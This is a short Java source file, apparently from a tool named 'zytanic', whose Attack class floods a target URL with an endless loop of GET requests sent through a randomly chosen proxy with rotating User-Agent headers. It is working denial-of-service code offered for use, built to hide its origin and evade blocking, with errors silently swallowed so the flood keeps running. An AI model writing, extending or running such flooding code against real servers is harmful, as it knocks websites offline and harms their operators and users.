package xyz.zytanic;

import xyz.zytanic.utils.ProxyLoader;
import xyz.zytanic.utils.UserAgents;

import java.io.IOException;
import java.net.*;
import java.util.Random;

public class Attack{


   public static void attack(String host,int proxynumber) throws IOException {
        try {

            Proxy proxy = ProxyLoader.getProxy(Integer.valueOf(new Random().nextInt(Main.e)));
            while (true) {
                URL url = new URL(host);

                HttpURLConnection con = (HttpURLConnection) url.openConnection(proxy);
                con.setRequestMethod("GET");
                con.setRequestProperty("User-Agent", UserAgents.getUserAgent());
                con.getResponseCode();
            }


        } catch (SocketException e) {

        } catch (ProtocolException e) {

        }



   }
}
